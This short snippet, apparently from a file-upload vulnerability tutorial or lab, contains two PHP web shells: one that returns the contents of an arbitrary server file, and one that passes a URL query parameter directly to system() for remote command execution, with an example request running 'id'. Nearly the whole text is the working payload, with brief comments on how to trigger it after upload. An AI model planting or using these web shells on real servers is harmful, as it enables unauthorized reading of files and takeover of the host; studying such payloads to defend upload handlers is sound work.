<?php echo file_get_contents('/path/to/target/file'); ?>
<!-- Once uploaded, sending a request for this malicious file will return the target file's contents in the response. -->


<?php echo system($_GET['command']); ?>

<!-- This script enables you to pass an arbitrary system command via a query parameter as follows:

GET /example/exploit.php?command=id HTTP/1.1 -->